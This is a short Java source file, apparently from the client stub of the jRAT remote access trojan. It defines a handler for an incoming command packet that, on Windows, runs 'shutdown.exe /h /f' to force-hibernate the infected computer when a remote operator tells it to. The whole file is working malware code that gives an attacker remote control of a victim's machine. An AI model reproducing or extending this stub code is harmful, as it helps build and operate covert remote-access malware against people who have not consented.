package se.jrat.stub.packets.incoming;

import com.redpois0n.oslib.OperatingSystem;

public class Packet31ComputerSleep extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe /h /f");
		}
	}

}
